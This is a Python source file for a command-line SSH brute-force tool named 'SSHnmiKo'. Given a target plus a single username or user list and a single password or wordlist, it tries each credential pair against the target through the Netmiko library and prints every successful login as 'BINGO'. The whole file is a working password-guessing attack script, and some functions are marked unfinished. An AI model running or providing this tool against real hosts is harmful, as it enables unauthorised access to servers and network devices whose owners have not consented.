#!/usr/bin/python3.8
import argparse
import time
import sys
from multiprocessing import Process
from netmiko import Netmiko
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime

time_start = datetime.now()
### special effects
msg_font=('puffy')
msg_ast=colored('[*]', 'yellow')
msg_int=colored('[!]', 'blue')
msg_ok=colored('[+]', 'green')
msg_fail=colored('[-]', 'red')
msg_banner="SSHnmiKo" 
msg_banner_custom = Figlet(font=msg_font)
msg_banner_color=colored(msg_banner_custom.renderText(msg_banner), 'blue')
### special effects
msg_usage=" \n Usase: python3 sshbrute_netmiko.py -t <target> -d <device> (optional) [ -u <username> | -U <userlist> ] [ -p <password> -w <wordlist.txt> ]"
msg_target="Name or IP Address"
msg_word="File with list of possible password" 
msg_user="Account name"
msg_userlist="File with list of possible account names" 
msg_device="Value default is Linux" 
msg_pass="Password"
msg_verbose="to define verbose mode" 

msg_start=" Please wait - Bruteforce attack running"
msg_method1=" Bruteforce SSH basic - based on only one an username and a password" 
msg_method2=" Bruteforce SSH - based on only one an username with dictonary (wordlist)" 
msg_method3=" Bruteforce SSH - based on an userlist file and a password" 
msg_method4=" Bruteforce SSH - based on an userlist and a wordlist" 
msg_method4_1=" This processo can demand more time, then please wait !" 

print(msg_banner_color)
option = argparse.ArgumentParser(description=msg_usage)
option.add_argument("-t","--target" ,  dest="target", help=msg_target)

useroptions = option.add_mutually_exclusive_group()
useroptions.add_argument("-u","--user" ,  dest="user", help=msg_user)
useroptions.add_argument("-U","--userlist" ,  dest="userlist", help=msg_userlist)

option.add_argument("-d","--device",default="linux",  dest="devicetype", help=msg_device, type=str)

worlistoptions = option.add_mutually_exclusive_group()
worlistoptions.add_argument("-W","--wordlist", dest="wordlist", help=msg_word)
worlistoptions.add_argument("-p","--password", dest="password", help=msg_pass)

option.add_argument("-v","--verbose",default="yes",  dest="verbose", help=msg_verbose, type=str)

option_args = option.parse_args()

if option_args.target == None:
    print(option.description)
    exit(0)

if option_args.user == None and option_args.userlist == None:
    print(option.description)
    exit(0)

if option_args.wordlist == None and option_args.password == None:
    print(option.description)
    exit(0)

username=str(option_args.user)
userlist=option_args.userlist
target=option_args.target
device=str(option_args.devicetype)
wordlist=option_args.wordlist
password=option_args.password
verbose=option_args.verbose

def user_pass():
    sshforcebrute(username,password)

def user_wordlist():
    with open(wordlist, "r") as _word:
        for _line in _word:
            _password = _line.strip("\n")
            _bingo=sshforcebrute(username,_password)
            if _bingo == "yes":
                break       
               
### Not finished
def userlist_pass():
    with open(userlist, "r") as _word:
        for _line in _word:
            _username = _line.strip("\n")
            sshforcebrute(_username,password)

### Not finished
def userlist_wordlist():
    with open(userlist, "r") as _word:
        for _line in _word:
            _username = _line.strip("\n")

            with open(wordlist, "r") as _word:
                for _line in _word:
                    _password = _line.strip("\n")
                    _bingo=sshforcebrute(_username,_password)

                    if _bingo == "yes":
                      break  
    
### Not finished
def sshforcebrute(_username,_password):
    try:
        sshconn = Netmiko(
            target, 
            username=_username, 
            password=_password, 
            device_type=device)

        sshconn.disconnect()
        print(msg_ok + " BINGO - Username: " + _username + " and Password: " + _password )
        return("yes")
        
    except:
        if verbose == "yes":
            print( msg_fail + " Fail - Username: " + _username + " and Password: " + _password )

# pyrotechnics
animation = "|/-\\"
def anime_gambi():
    for i in range(1800):
        time.sleep(0.5)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
        #print("END")

print(msg_ast + " " + msg_start)
if option_args.user != None and option_args.password != None:
    print(msg_int + msg_method1)
    user_pass()

if option_args.user != None and option_args.wordlist != None:
    print(msg_int + msg_method2)
    user_wordlist()
    
if option_args.userlist != None and option_args.password != None:
    print(msg_int + msg_method3)
    userlist_pass()

if option_args.userlist != None and option_args.wordlist != None:
    print(msg_int + msg_method4)
    print(msg_int + msg_method4_1)
    
    func1 = Process(target=anime_gambi)
    func2 = Process(target=userlist_wordlist)
    func1.start()
    func2.start()
    #func1.join()
    #func2.join()

time_end = datetime.now()
time_attack = time_end - time_start
print("\n" + msg_ast + " Time of attack was => " + str(time_attack))
